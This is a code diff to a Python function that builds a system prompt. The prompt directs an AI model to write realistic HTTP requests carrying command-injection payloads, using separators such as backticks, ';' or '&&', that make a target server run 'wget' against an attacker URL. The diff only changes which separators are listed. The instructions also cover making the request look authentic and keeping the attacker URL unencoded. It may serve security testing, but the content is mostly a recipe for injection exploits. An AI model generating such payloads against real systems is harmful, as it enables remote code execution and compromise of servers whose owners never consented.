@@ -29,7 +29,7 @@ def _build_http_system_prompt(attacker_url: str) -> str:
         "- Derive the HTTP method and media type from the sample or code. If JSON, send a compact JSON body; if form data, keep it URL-encoded; if plaintext or multipart, follow that format exactly. Only fall back to POST with 'application/x-www-form-urlencoded; charset=UTF-8' when the handler's expectations are unknown.\n"
         "- Include realistic headers similar to: User-Agent, Accept, Accept-Language, Accept-Encoding, Content-Type, X-Requested-With, Origin, Connection, Referer, Cookie (if applicable).\n"
         "- Host header must reflect the known target; if unknown, use 'Host: TARGET'. If a Target Hint is provided, use its host:port, and mirror it in Origin/Referer.\n"
-        f"- Body should contain a minimal injection payload using separators like ';' or '&&' to trigger command execution, referencing a plausible vulnerable parameter. The payload's purpose is to run 'wget {attacker_url}'.\n"
+        f"- Body should contain a minimal injection payload using separators like '`' or ';' to trigger command execution, referencing a plausible vulnerable parameter. The payload's purpose is to run 'wget {attacker_url}'.\n"
         "- Content-Length MUST be the exact UTF-8 byte length of the body. Determine it AFTER finalizing the exact body content (including any trailing newline if present). Do not guess.\n"
         f"- IMPORTANT: The attacker URL in the body MUST be plaintext (NOT percent-encoded). Do NOT URL-encode the '{attacker_url}' or the separators ';'/'&&'. If credentials/cookies are needed, include a realistic placeholder cookie, e.g., 'Cookie: Authorization=REPLACE_ME'.\n"
         "\n"
